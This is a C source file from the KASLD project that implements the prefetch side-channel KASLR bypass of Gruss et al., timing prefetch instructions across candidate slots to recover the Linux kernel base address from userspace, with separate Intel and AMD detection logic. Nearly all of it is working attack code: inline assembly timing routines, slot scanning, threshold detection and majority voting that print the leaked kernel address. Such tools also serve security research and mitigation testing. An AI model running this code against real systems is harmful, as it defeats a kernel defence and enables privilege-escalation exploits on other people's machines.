// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Prefetch side-channel KASLR bypass.
//
// Technique by Daniel Gruss, Clémentine Maurice, Anders Fogh, Moritz Lipp,
// and Stefan Mangard, presented at USENIX Security 2016:
// "Prefetch Side-Channel Attacks: Bypassing SMAP and KASLR"
//
// The x86 prefetch instructions (prefetchnta, prefetcht2, ...) trigger
// address translation but do not raise faults on inaccessible memory.
// Their execution time varies depending on whether the target virtual
// address has a valid mapping in the page table hierarchy.
//
// By timing prefetch across every possible KASLR slot we can identify
// where the kernel text is mapped, defeating KASLR from userspace.
//
// On x86_64 with the default 2 MiB alignment there are 512 candidate
// positions in the 1 GiB window [0xffffffff80000000, 0xffffffffc0000000).
// The technique completes in under a second.
//
// Requires KPTI to be disabled to work, because KPTI unmaps kernel pages
// from userspace page tables, eliminating the timing differential. The
// kernel auto-disables KPTI on CPUs that are not vulnerable to Meltdown
// (CVE-2017-5754): all AMD CPUs, and Intel CPUs from ~2019 onward (Ice
// Lake and later) with hardware mitigations. KPTI can also be manually
// disabled with the "nopti" kernel parameter.
//
// Unlike EntryBleed (CVE-2022-4543), this technique does not require
// kernel-version-specific offsets.
//
// Intel strategy:
//   Mapped kernel pages resolve faster (TLB hit) than unmapped ones.
//   The kernel base is the slot with the minimum prefetch latency.
//   Per-slot minimums across iterations are used.
//
// AMD strategy:
//   The timing signal is inverted: mapped pages produce higher latency
//   than unmapped ones (the page walk completes fully rather than being
//   quickly NOPped). Per-slot sums across iterations are used because
//   rdtscp on some AMD CPUs only resolves to ~36-cycle quanta (min and
//   median collapse to a single quantum; sums preserve the slow-vs-fast
//   proportion as a continuous value). The kernel base is found by
//   threshold detection: the median sum establishes the unmapped
//   baseline, and the kernel region is the leftmost cluster of slots
//   whose sums exceed 1.5x the median. The confirmation window filters
//   PDP entry boundary artifacts (~1.2x median, 7 slots wide every 128
//   slots) and isolated scheduling outliers.
//
// Limitations:
//   - Requires KPTI to be disabled (no signal through KPTI page tables).
//   - On some newer AMD microarchitectures the prefetch timing
//     differential for mapped vs unmapped kernel pages is absent; the
//     attack silently fails on these CPUs. A dedicated technique for
//     newer AMD generations (e.g. Zen 3+) may be required.
//   - Timing resolution depends on rdtscp granularity, which varies
//     across microarchitectures.
//
// Timing measurement inline asm based on the EntryBleed PoC by Will:
//   https://www.willsroot.io/2022/12/entrybleed.html
//
// AMD vendor-specific handling informed by Google security-research
// kernelctf submission (CVE-2023-6817) by 'run':
//   https://github.com/google/security-research/blob/master/pocs/linux/
//   kernelctf/CVE-2023-6817_mitigation/exploit/mitigation-v3-6.1.55/exploit.c
//
// References:
//   https://gruss.cc/files/prefetch.pdf
//   https://github.com/IAIK/prefetch
//   https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/gruss
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int verbose = 0;

#define CPU_VENDOR_UNKNOWN 0
#define CPU_VENDOR_AMD 1
#define CPU_VENDOR_INTEL 2

// ---------------------------------------------------------------------------
// Check for rdtscp support via CPUID (function 0x80000001, EDX bit 27).
// Returns 1 if rdtscp is available, 0 otherwise.
// ---------------------------------------------------------------------------
static int has_rdtscp(void) {
  unsigned int eax, ebx, ecx, edx;
  __asm__ volatile("cpuid"
                   : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                   : "a"(0x80000001)
                   :);
  return (edx >> 27) & 1;
}

// ---------------------------------------------------------------------------
// CPU pinning - reduce noise from cross-core migration
// ---------------------------------------------------------------------------
static void pin_to_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

// ---------------------------------------------------------------------------
// Detect CPU vendor from /proc/cpuinfo.
// Returns CPU_VENDOR_AMD, CPU_VENDOR_INTEL, or CPU_VENDOR_UNKNOWN.
// ---------------------------------------------------------------------------
static int detect_cpu_vendor(void) {
  int cpu = CPU_VENDOR_UNKNOWN;
  FILE *f = fopen("/proc/cpuinfo", "r");
  if (!f)
    return cpu;

  char *line = NULL;
  size_t len = 0;
  while (getline(&line, &len, f) != -1) {
    if (strstr(line, "vendor") == NULL)
      continue;
    if (strstr(line, "AuthenticAMD") != NULL) {
      cpu = CPU_VENDOR_AMD;
      break;
    }
    if (strstr(line, "GenuineIntel") != NULL) {
      cpu = CPU_VENDOR_INTEL;
      break;
    }
  }
  free(line);
  fclose(f);
  return cpu;
}

// ---------------------------------------------------------------------------
// Check if KPTI is enabled (presence of "pti" in /proc/cpuinfo flags).
// Returns 1 if KPTI is enabled, 0 otherwise.
// ---------------------------------------------------------------------------
static int detect_kpti(void) {
  FILE *f = fopen("/proc/cpuinfo", "r");
  if (!f)
    return -1;

  char *line = NULL;
  size_t len = 0;
  int pti = 0;

  while (getline(&line, &len, f) != -1) {
    if (strstr(line, "flags") == NULL)
      continue;
    if (strstr(line, " pti") != NULL) {
      pti = 1;
      break;
    }
  }

  free(line);
  fclose(f);
  return pti;
}

// ---------------------------------------------------------------------------
// Prefetch side-channel measurement.
//
// Issues prefetchnta + prefetcht2 on the target address bracketed by
// serialising instructions (mfence/lfence) and timed with rdtscp.
//
// The double-prefetch (NTA then T2) amplifies the timing differential
// as described in Gruss et al.
//
// Measurement sequence based on EntryBleed PoC by Will.
// ---------------------------------------------------------------------------
static uint64_t time_prefetch(uint64_t addr) {
  uint64_t t0_lo, t0_hi, t1_lo, t1_hi;

  __asm__ volatile(".intel_syntax noprefix;"
                   "mfence;"
                   "rdtscp;"
                   "mov %0, rax;"
                   "mov %1, rdx;"
                   "xor rax, rax;"
                   "lfence;"
                   "prefetchnta qword ptr [%4];"
                   "prefetcht2 qword ptr [%4];"
                   "xor rax, rax;"
                   "lfence;"
                   "rdtscp;"
                   "mov %2, rax;"
                   "mov %3, rdx;"
                   "mfence;"
                   ".att_syntax;"
                   : "=r"(t0_lo), "=r"(t0_hi), "=r"(t1_lo), "=r"(t1_hi)
                   : "r"(addr)
                   : "rax", "rbx", "rcx", "rdx");

  uint64_t t0 = (t0_hi << 32) | t0_lo;
  uint64_t t1 = (t1_hi << 32) | t1_lo;
  return t1 - t0;
}

// ---------------------------------------------------------------------------
// Collect per-slot timing data.
//
// For each slot, takes the minimum across all measured iterations.
// The minimum is the least-noised sample and produces a cleaner signal
// than averaging, which dilutes outliers but also dilutes the real
// timing differential.
//
// No syscall between probes: unlike EntryBleed (which measures
// TLB state populated by the syscall entry path), the classic
// prefetch attack measures page-table-walk latency. The page table
// hierarchy is static — a syscall between probes only adds noise
// and overhead.
// ---------------------------------------------------------------------------

#define STEP KERNEL_ALIGN
#define NUM_SLOTS ((KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP)
#define ITERATIONS 64
#define WARMUP 3

static void collect_timings(uint64_t *times) {
  unsigned long idx;
  int i;

  for (idx = 0; idx < NUM_SLOTS; idx++)
    times[idx] = ~(uint64_t)0;

  for (i = 0; i < WARMUP + ITERATIONS; i++) {
    for (idx = 0; idx < NUM_SLOTS; idx++) {
      uint64_t target = KERNEL_BASE_MIN + idx * STEP;
      uint64_t t = time_prefetch(target);

      if (i >= WARMUP && t < times[idx])
        times[idx] = t;
    }
  }
}

// ---------------------------------------------------------------------------
// Collect per-slot timing data using sum across iterations.
//
// On AMD CPUs with coarsely quantized rdtscp (e.g. 36-cycle steps),
// min and median lose information: min collapses to the floor when
// even one fast outlier occurs, and median snaps to a single quantum
// when the slow/fast split is near 50/50. Summing all samples
// preserves the proportion of slow vs fast measurements as a
// continuous value, enabling edge detection even when the per-sample
// signal is smaller than one rdtscp quantum.
// ---------------------------------------------------------------------------
static void collect_timings_amd(uint64_t *times) {
  unsigned long idx;
  int i;

  for (idx = 0; idx < NUM_SLOTS; idx++)
    times[idx] = 0;

  for (i = 0; i < WARMUP; i++)
    for (idx = 0; idx < NUM_SLOTS; idx++)
      time_prefetch(KERNEL_BASE_MIN + idx * STEP);

  for (i = 0; i < ITERATIONS; i++)
    for (idx = 0; idx < NUM_SLOTS; idx++)
      times[idx] += time_prefetch(KERNEL_BASE_MIN + idx * STEP);
}

// ---------------------------------------------------------------------------
// Dump per-slot timing data to stderr (verbose mode).
// ---------------------------------------------------------------------------
static void dump_timings(const uint64_t *times, const char *stat) {
  unsigned long idx;
  fprintf(stderr, "# slot addr %s\n", stat);
  for (idx = 0; idx < NUM_SLOTS; idx++) {
    fprintf(stderr, "%3lu 0x%lx %lu\n", idx,
            (unsigned long)(KERNEL_BASE_MIN + idx * STEP),
            (unsigned long)times[idx]);
  }
}

// ---------------------------------------------------------------------------
// Intel strategy: find the single slot with the lowest prefetch time.
// Mapped pages resolve faster (TLB hit) on Intel.
// ---------------------------------------------------------------------------
static unsigned long find_base_intel(const uint64_t *times) {
  uint64_t min_time = ~(uint64_t)0;
  unsigned long best = 0;
  unsigned long idx;

  for (idx = 0; idx < NUM_SLOTS; idx++) {
    if (times[idx] < min_time) {
      min_time = times[idx];
      best = idx;
    }
  }

  return KERNEL_BASE_MIN + best * STEP;
}

// ---------------------------------------------------------------------------
// AMD strategy: threshold-based detection with confirmation.
//
// On AMD, mapped pages produce higher prefetch latency than unmapped.
// The per-slot sums reflect this: unmapped slots cluster around a
// baseline value, while kernel-mapped slots are significantly higher.
//
// Algorithm:
// 1. Sort a copy of the sums to find the median — a robust estimate
//    of the unmapped baseline (since most slots are unmapped).
// 2. Set threshold = median * 3/2 (50% above baseline). This sits
//    between PDP entry boundary artifacts (~20% above baseline,
//    7 slots wide every 128 slots) and kernel mapping (~70% above).
// 3. Scan left-to-right for the leftmost slot where at least
//    CONFIRM_K of the next CONFIRM_M slots exceed the threshold.
//    This confirmation requirement filters isolated scheduling
//    outliers (which spike a single slot to 10x+).
//
// Returns 0 if no confirmed cluster is found (attack fails on this
// CPU, or KPTI-like mitigation is active).
// ---------------------------------------------------------------------------
#define CONFIRM_K 5
#define CONFIRM_M 8

static int cmp_u64(const void *a, const void *b) {
  uint64_t va = *(const uint64_t *)a;
  uint64_t vb = *(const uint64_t *)b;
  return (va > vb) - (va < vb);
}

static unsigned long find_base_amd(const uint64_t *times) {
  uint64_t sorted[NUM_SLOTS];
  unsigned long idx;

  memcpy(sorted, times, sizeof(sorted));
  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);

  uint64_t median = sorted[NUM_SLOTS / 2];
  uint64_t threshold = median + median / 2;

  if (verbose)
    fprintf(stderr, "# AMD threshold: %lu (median=%lu)\n",
            (unsigned long)threshold, (unsigned long)median);

  for (idx = 0; idx + CONFIRM_M <= NUM_SLOTS; idx++) {
    /* The candidate slot itself must be above threshold — prevents
       the window from triggering early when unmapped slots precede
       the actual kernel boundary. */
    if (times[idx] <= threshold)
      continue;
    int count = 0;
    unsigned long j;
    for (j = 0; j < CONFIRM_M; j++) {
      if (times[idx + j] > threshold)
        count++;
    }
    if (count >= CONFIRM_K)
      return KERNEL_BASE_MIN + idx * STEP;
  }

  return 0;
}

// ---------------------------------------------------------------------------
// Majority vote across multiple passes.
// ---------------------------------------------------------------------------
#define NUM_PASSES 7

static unsigned long majority_vote(int cpu_vendor) {
  unsigned long results[NUM_PASSES];
  uint64_t times[NUM_SLOTS];
  int i;

  for (i = 0; i < NUM_PASSES; i++) {
    if (cpu_vendor == CPU_VENDOR_AMD)
      collect_timings_amd(times);
    else
      collect_timings(times);

    if (verbose && i == 0)
      dump_timings(times,
                   cpu_vendor == CPU_VENDOR_AMD ? "sum_cycles" : "min_cycles");

    if (cpu_vendor == CPU_VENDOR_AMD)
      results[i] = find_base_amd(times);
    else
      results[i] = find_base_intel(times);

    if (verbose)
      fprintf(stderr, "# pass %d: 0x%lx\n", i, results[i]);
  }

  /* Boyer-Moore majority vote */
  unsigned long candidate = 0;
  int count = 0;

  for (i = 0; i < NUM_PASSES; i++) {
    if (count == 0) {
      candidate = results[i];
      count = 1;
    } else if (results[i] == candidate) {
      count++;
    } else {
      count--;
    }
  }

  /* Verify the candidate actually has majority */
  count = 0;
  for (i = 0; i < NUM_PASSES; i++) {
    if (results[i] == candidate)
      count++;
  }

  if (count > NUM_PASSES / 2)
    return candidate;

  return 0;
}

// ---------------------------------------------------------------------------
// Main entry point.
// ---------------------------------------------------------------------------
static unsigned long get_kernel_addr_prefetch(void) {
  int cpu = detect_cpu_vendor();
  int pti = detect_kpti();

  if (cpu == CPU_VENDOR_UNKNOWN)
    printf("[.] unknown CPU vendor, assuming Intel-like behavior\n");
  else
    printf("[.] %s CPU detected\n", cpu == CPU_VENDOR_AMD ? "AMD" : "Intel");

  if (!has_rdtscp()) {
    fprintf(stderr, "[-] rdtscp instruction not supported on this CPU\n");
    return 0;
  }

  if (pti == 1) {
    fprintf(stderr,
            "[-] KPTI is enabled; prefetch side-channel is ineffective\n"
            "    (kernel pages unmapped from userspace page tables)\n");
    return 0;
  }

  if (pti == 0)
    printf("[.] KPTI is disabled\n");
  else
    printf("[.] unable to determine KPTI status, proceeding anyway\n");

  pin_to_cpu(0);

  unsigned long addr = majority_vote(cpu);

  if (!addr) {
    fprintf(stderr, "[-] majority vote failed across %d passes\n", NUM_PASSES);
    return 0;
  }

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char *argv[]) {
  if (argc > 1 && strcmp(argv[1], "-v") == 0)
    verbose = 1;

  printf("[.] trying prefetch side-channel ...\n");

  unsigned long addr = get_kernel_addr_prefetch();
  if (!addr)
    return 1;

  printf("possible kernel base: %lx\n", addr);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, "prefetch");

  return 0;
}
